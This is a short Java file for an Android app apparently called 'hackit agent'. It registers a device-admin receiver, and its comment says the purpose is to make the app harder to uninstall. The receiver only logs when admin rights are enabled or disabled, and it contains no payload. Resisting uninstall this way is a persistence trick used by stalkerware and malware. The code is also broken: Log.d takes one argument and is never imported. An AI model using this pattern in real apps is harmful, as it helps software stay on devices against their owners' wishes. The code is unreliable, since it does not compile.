package com.hackit.agent;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

/** Device-admin entry so the app is harder to uninstall casually. */
public class AdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) {
        Log.d("admin enabled");
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        Log.d("admin disabled");
    }
}
